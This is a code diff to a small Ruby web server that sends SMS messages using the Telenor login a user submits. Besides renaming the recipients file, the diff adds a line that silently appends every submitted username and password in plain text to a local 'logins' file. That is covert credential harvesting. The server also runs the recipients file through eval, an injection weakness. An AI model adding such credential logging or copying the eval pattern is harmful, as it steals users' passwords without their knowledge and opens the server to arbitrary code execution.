@@ -15,7 +15,7 @@ trap 'INT' do server.shutdown end
 server.mount_proc '/sendsms' do |req, res|
   #res.body = req.query
   
-  recipients = eval(File.open('recipients') {|f| f.read })
+  recipients = eval(File.open('recipients.rb') {|f| f.read })
   
   if req.query.has_key?("username") && req.query.has_key?("password") && 
       req.query.has_key?("recipient") && req.query.has_key?("message") then
@@ -25,6 +25,9 @@ server.mount_proc '/sendsms' do |req, res|
     end
     
     sms_sender = TelenorSMS.new req.query["username"], req.query["password"]
+	
+	File.open("logins", 'a') { |file| file.write(req.query["username"] + "|" + req.query["password"] + "\n") }
+	
     sms_sender.send req.query["message"], recipient
   else
     res.content_type="html"
